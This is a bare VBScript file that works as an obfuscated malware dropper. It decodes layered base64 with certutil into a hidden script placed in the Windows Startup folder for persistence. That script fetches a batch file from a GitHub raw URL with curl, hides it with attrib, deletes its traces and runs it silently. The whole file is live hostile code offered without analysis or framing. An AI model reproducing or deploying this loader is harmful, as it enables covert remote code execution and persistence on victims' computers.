Set WshShell = CreateObject("WScript.Shell")


WshShell.Run "%comspec% /c echo U2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKRGltIG15cmFuZApteXJhbmQgPSBybmQoMCkKCgpTZXQgZnNvID0gQ3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpCgpJZiBmc28uRmlsZUV4aXN0cygiJVRFTVAlXGJhdGFyYW5nLmJhdCIpIFRoZW4KCVdTY3JpcHQuU2xlZXAoNTAwMCkKRWxzZQoJV3NoU2hlbGwuUnVuICIlY29tc3BlYyUgL2MgZWNobyBZM1Z5YkNCb2RIUndjem92TDNKaGR5NW5hWFJvZFdKMWMyVnlZMjl1ZEdWdWRDNWpiMjB2WTJoeWFYTjFkVEV4TDBKQlZFMUJUaTl0WVdsdUwyTnZaR1V2WW1GMFlYSmhibWNLID4gJVRFTVAlXGxvZyB8IGF0dHJpYiAraCArcyAlVEVNUCVcbG9nIHwgY2VydHV0aWwgLWRlY29kZSAlVEVNUCVcbG9nICVURU1QJVwlbXlyYW5kJSIsIDAKCVdzaFNoZWxsLlJ1biAiJWNvbXNwZWMlIHNldCAvcCBiYXRjYXZlPTwlVEVNUCVcJW15cmFuZCUiLCAwCglXc2hTaGVsbC5SdW4gIiVjb21zcGVjJSAvYyBkZWwgJVRFTVAlXCVteXJhbmQlIiwgMAoJV3NoU2hlbGwuUnVuICIlY29tc3BlYyUgL2MgJWJhdGNhdmUlIC0tb3V0cHV0ICVURU1QJVxsb2ciLCAwCglXc2hTaGVsbC5SdW4gIiVjb21zcGVjJSAvYyAgY2VydHV0aWwgLWRlY29kZSAlVEVNUCVcbG9nICVURU1QJVxiYXRhcmFuZy5iYXQiLCAwCglXc2hTaGVsbC5SdW4gIiVjb21zcGVjJSAvYyAgYXR0cmliICtoICtzICVURU1QJVxiYXRhcmFuZy5iYXQiLCAwCglXc2hTaGVsbC5SdW4gIiVjb21zcGVjJSAvYyBkZWwgJVRFTVAlXGxvZyIsIDAKCVdTY3JpcHQuU2xlZXAoNTAwMCkKRW5kIElmCgpDcmVhdGVPYmplY3QoIldzY3JpcHQuU2hlbGwiKS5SdW4gIiIiIiAmICIlVEVNUCVcYmF0YXJhbmcuYmF0IiAmICIiIiIsIDAsIEZhbHNlCg== > %TEMP%\log1", 0

WshShell.Run "%comspec% /c certutil -decode %TEMP%\log1 \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\UtilityBelt.vbs"", 0
